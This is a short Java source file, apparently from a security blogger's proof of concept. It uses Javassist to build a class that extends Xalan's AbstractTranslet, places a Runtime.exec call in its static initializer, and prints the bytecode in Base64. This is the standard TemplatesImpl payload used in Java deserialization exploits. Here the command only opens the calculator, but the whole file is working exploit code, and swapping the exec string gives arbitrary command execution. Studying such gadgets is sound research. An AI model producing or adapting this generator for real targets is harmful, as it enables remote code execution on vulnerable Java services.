import javassist.ClassPool;
import javassist.CtClass;

import java.util.Base64;

/**
 * @author <a href="http://blog.chenforcode.cn">PKUCoder</a>
 * @date 2022/3/19 5:29 下午
 * @description
 */
public class Exp {
    public static class StaticBlock {
    }
    public static void main(String[] args) throws Exception {
        // 生成恶意 bytecodes
        String code = "{java.lang.Runtime.getRuntime().exec(\"open -a /Applications/Calculator.app\");}";
        ClassPool pool = ClassPool.getDefault();
        // 父类必须是 AbstractTranslet
        CtClass clazz = pool.get(StaticBlock.class.getName());
        clazz.setSuperclass(pool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        clazz.makeClassInitializer().insertBefore(code);
        byte[] bytecodes = clazz.toBytecode();
        String base64encodedString = Base64.getEncoder().encodeToString(bytecodes);
        // 输出base64后的 bytecodes
        System.out.println(base64encodedString);
    }
}
